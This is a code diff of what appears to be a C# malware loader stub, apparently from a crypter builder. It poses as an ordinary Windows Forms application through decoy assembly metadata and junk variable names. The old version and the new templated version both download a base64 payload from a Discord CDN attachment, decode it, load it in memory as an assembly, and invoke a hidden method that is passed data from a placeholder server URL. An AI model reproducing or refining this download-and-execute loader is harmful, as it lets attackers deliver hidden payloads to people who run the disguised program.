@@ -13,11 +13,11 @@ using System.Windows.Forms;
 
 
 
-//Default [assembly: AssemblyTitle("Windows Forms Application .exe")]
-//Default [assembly: AssemblyDescription("Windows Forms Application ")]
-//Default [assembly: AssemblyProduct("Windows Forms Application ")]
-//Default [assembly: AssemblyCopyright("Windows Forms Application  ©  2012")]
-//Default [assembly: AssemblyFileVersion("2.0.0.0")]
+//Default [assembly: AssemblyTitle("Windows Application .exe")]
+//Default [assembly: AssemblyDescription("Windows Application")]
+//Default [assembly: AssemblyProduct("Windows Forms ")]
+//Default [assembly: AssemblyCopyright("Windows Forms © 2012")]
+//Default [assembly: AssemblyFileVersion("3.4.0.0")]
 
 //Assembly [assembly: AssemblyTitle("{1}")]
 //Assembly [assembly: AssemblyDescription("{2}")]
@@ -27,14 +27,14 @@ using System.Windows.Forms;
 //Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
 
 
-public class settings 
+public class settings
 {
 
 
     [STAThread]
     public static void Main(string[] args)
         {
-            using (WebClient githubusercontent = new WebClient())
+            using (WebClient fff = new WebClient())
             {
 
                 try
@@ -63,38 +63,37 @@ public class settings
 
 
 
-                    string Wa5knROCfk;
+                    string %1%;
 
-                    Wa5knROCfk = "https://cdn.discordapp.com/attachments/844669981151985754/845012637875437598/https_web.whatsapp.com_https_web.whatsapp.com_https_web.whatsapp.com_https_web.whatsapp.com_https_we.txt";
+                    %1% = "https://cdn.discordapp.com/attachments/844669981151985754/845847751560265748/OBS_Studio.txt";
 
-                    WebClient tureng;
+                    WebClient %2%;
 
-                    tureng = new WebClient();
+                    %2% = new WebClient();
 
-                    string utility;
+                    string %3%;
 
-                    utility = tureng.DownloadString(Wa5knROCfk);
+                    %3% = %2%.DownloadString(%1%);
 
-                    byte[] comboBox2;
+                    byte[] %4%;
 
-                    comboBox2 = Convert.FromBase64String(utility);
+                    %4% = Convert.FromBase64String(%3%);
 
-                    string amountPaid = "pizzaorder.buynow";
+                    string S = "pizzaorder.buynow";
 
-                    string ingilizce = "meseken";
+                    string %5% = "meseken";
 
+                    object spider = new object[] { %aPP%, string.Empty, fff.DownloadData("%Server%"), true };
 
-                    object spider = new object[] { %aPP%, string.Empty, githubusercontent.DownloadData("%Server%"), true };
-
-                    string instagram = amountPaid;
-
-
-                    Assembly Kamp;
-
-                    Kamp  = AppDomain.CurrentDomain.Load(comboBox2);
+                    string %6% = S;
 
 
-                    Kamp.GetType(instagram).InvokeMember(ingilizce, System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])spider);
+                    Assembly A;
+
+                    A  = AppDomain.CurrentDomain.Load(%4%);
+
+
+                    A.GetType(%6%).InvokeMember(%5%, System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])spider);
 
 
 
